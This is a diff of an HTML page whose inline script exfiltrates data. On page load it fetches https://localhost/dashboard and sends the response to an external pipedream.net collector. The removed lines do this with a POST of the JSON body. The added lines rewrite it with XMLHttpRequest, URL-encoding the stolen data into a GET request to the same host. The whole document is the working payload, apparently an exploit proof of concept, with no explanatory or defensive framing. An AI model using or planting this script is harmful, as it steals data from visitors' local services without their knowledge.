@@ -8,14 +8,17 @@
 </head>
 <body>
     <script>
-       fetch('https://localhost/dashboard')
-          .then(res => res.json())
-          .then(data => fetch('https://eo152lqegwprrxn.m.pipedream.net/', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(data)
-  }))
-  .catch(console.error);
+      const getReq = new XMLHttpRequest();
+getReq.open('GET', 'https://localhost/dashboard', true);
+getReq.onload = () => {
+  if (getReq.status === 200) {
+    const data = encodeURIComponent(getReq.responseText); // Encode data for URL
+    const sendReq = new XMLHttpRequest();
+    sendReq.open('GET', `https://eo152lqegwprrxn.m.pipedream.net/${data}`, true);
+    sendReq.send();
+  }
+};
+getReq.send();
     </script>
 </body>
 </html>
